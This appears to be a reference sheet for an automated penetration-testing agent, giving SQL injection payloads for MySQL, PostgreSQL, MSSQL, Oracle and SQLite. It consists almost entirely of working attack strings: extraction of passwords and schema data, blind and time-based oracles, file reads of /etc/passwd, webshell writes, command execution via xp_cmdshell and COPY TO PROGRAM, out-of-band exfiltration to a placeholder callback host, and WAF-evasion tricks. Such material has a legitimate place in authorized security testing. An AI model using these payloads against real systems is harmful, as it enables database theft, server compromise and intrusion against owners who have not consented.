# SQL injection — depth reference

Load when `sqli` confirmed a channel and you need per-DBMS syntax, extraction
loops, file/OOB escalation, or WAF evasion. Payloads below assume the quoted
context already confirmed; adapt quoting to the context `probe_sqli` matched.

## Per-DBMS fingerprint (run once)

| DBMS | Version probe | Distinguishing behavior |
|---|---|---|
| MySQL | `@@version`, `version()` | `/*!inline*/` comments execute |
| PostgreSQL | `version()` | `CAST(x AS int)` errors leak values |
| MSSQL | `@@version` | stacked `';` queries, `xp_cmdshell` |
| Oracle | `SELECT banner FROM v$version` | requires `FROM dual`; no stacked queries |
| SQLite | `sqlite_version()` | `sqlite_master` schema table |

## UNION extraction

Column count: `ORDER BY N` raising N until the page errors (or use
`probe_sqli(url, param, union_cols=10)` which automates this in the confirmed
context). Then `UNION SELECT NULL,...,marker` — move the marker per position
to learn which column renders. Data types must match per column; pad
non-string columns with `NULL`.

| DBMS | Tables | Columns | Rows |
|---|---|---|---|
| MySQL | `information_schema.tables` | `information_schema.columns WHERE table_name='x'` | `GROUP_CONCAT(col)` packs rows |
| PostgreSQL | `pg_tables WHERE schemaname='public'` | `information_schema.columns` | `string_agg(col,',')` |
| MSSQL | `sys.tables` / `sysobjects WHERE xtype='U'` | `information_schema.columns` | `TOP 1`, `FOR XML PATH` packs |
| Oracle | `all_tables` | `all_tab_columns WHERE table_name='X'` | `LISTAGG` (11g+) |

## Error-based extraction (value lands in the error text)

| DBMS | Payload |
|---|---|
| MySQL | `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -` |
| MySQL | `' AND updatexml(1,concat(0x7e,(SELECT @@datadir)),1)-- -` |
| MySQL 5.7+ | `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)-- -` |
| PostgreSQL | `' AND 1=CAST((SELECT version()) AS int)--` |
| MSSQL | `' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))--` |
| Oracle | `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--` |

`extractvalue`/`updatexml` truncate at ~32 chars — page through with
`SUBSTRING((SELECT ...),1,30)`, `(SELECT ...),31,30)`.

## Boolean-blind extraction

Oracle: `ASCII(SUBSTRING((SELECT expr),pos,1)) > N` — binary-search ~7
requests/char; a linear scan over the charset is an order of magnitude slower
and will hit the request budget. Establish the true/false signal on a
throwaway predicate first, then reuse it verbatim per character.

| DBMS | Predicate |
|---|---|
| MySQL | `' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77-- -` |
| PostgreSQL | `' AND ASCII(SUBSTRING((SELECT usename FROM pg_user LIMIT 1),1,1))>77--` |
| MSSQL | `' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>77--` |
| Oracle | `' AND (SELECT SUBSTR(banner,1,1) FROM v$version WHERE rownum=1)='O'--` |

## Time-blind extraction

| DBMS | Sleep | Conditional form |
|---|---|---|
| MySQL | `SLEEP(5)` | `' AND IF(cond,SLEEP(5),0)-- -` |
| PostgreSQL | `pg_sleep(5)` | `' AND (SELECT CASE WHEN cond THEN pg_sleep(5) ELSE pg_sleep(0) END)--` |
| MSSQL | `WAITFOR DELAY '0:0:5'` | `'; IF (cond) WAITFOR DELAY '0:0:5'--` |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` |

A conditional sleep costs one full sleep per bit — binary-search with `>` is
~7 sleeps/char, equality per charset char is ~30+. Measure baseline jitter
before setting a threshold; keep requests sequential.

## File operations (needs privilege — verify before claiming)

| DBMS | Read | Write / exec |
|---|---|---|
| MySQL | `LOAD_FILE('/etc/passwd')` (needs FILE priv; check `secure_file_priv`) | `INTO OUTFILE '/path/shell.php'` / `INTO DUMPFILE` (binary-safe) |
| PostgreSQL | `pg_read_file('/etc/passwd')` (superuser/`pg_read_server_files`) | `COPY (SELECT '') TO PROGRAM 'cmd'` (superuser) |
| MSSQL | `OPENROWSET(BULK 'C:\path', SINGLE_CLOB)` | `xp_cmdshell` after `sp_configure 'xp_cmdshell',1` |
| Oracle | `UTL_FILE` needs a directory object | `DBMS_SCHEDULER` / Java stored proc |

File-write payloads (webshell shapes) belong on `send_raw` with the path
confirmed writable — do not claim file-read from a load_file-shaped payload
that returned nothing.

## Out-of-band extraction (response shows nothing)

| DBMS | Payload |
|---|---|
| Oracle | `' AND 1=UTL_HTTP.REQUEST('http://<oob-host>/'||(SELECT banner FROM v$version WHERE rownum=1))--` |
| MSSQL | `'; EXEC master..xp_dirtree '\\<oob-host>\share'--` (SMB) |
| MySQL | `' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.<oob-host>\\x'))-- -` (Windows SMB only) |
| PostgreSQL | `dblink` / `COPY ... TO PROGRAM 'curl <oob-host>'` |

The outbound callback itself is the evidence — record the listener hit via
`note`; the HTTP response to the injection stays uninformative.

## Second-order / stored injection

Value stored cleanly, query built later (report job, admin page, async
worker): inject a benign marker first, trigger the consumer, then apply the
true/false pair against the consumer's output — not the storing endpoint.
The falsifier applies only after the consuming page has been fetched and
shows no injected effect.

## WAF / filter evasion

| Filtered | Techniques |
|---|---|
| `SELECT`/`UNION` keywords | case mix `UnIoN`, inline comments `UN/**/ION`, MySQL `/*!UNION*/ /*!SELECT*/` (executes) |
| whitespace | `/**/`, `+`, `%09`/`%0a`, parentheses `AND(1=1)` |
| single quotes | hex literals `0x61646d696e`, `CHAR(0x61,0x64)` concat, numeric contexts need none |
| full payloads | double-encode `%2527` (decodes twice through proxies), unicode `\u0027` in JSON bodies |
| `OR`/`AND` | `||`, `&&` where the dialect accepts |

Try one evasion class at a time and keep the working primitive stable — a WAF
bypass that also changes the injection semantics proves nothing about either.

## Stuck

Same injection point, 3 payloads, no new signal → the layer is wrong, not the
payload. Move between: error channel, boolean oracle, timing oracle,
UNION-in-page, OOB callback, second-order consumer. A scanner adapter
(`run_exploit` manifest) can reproduce the channel but its summary is not
evidence — cite the recorded request/response or extracted value.
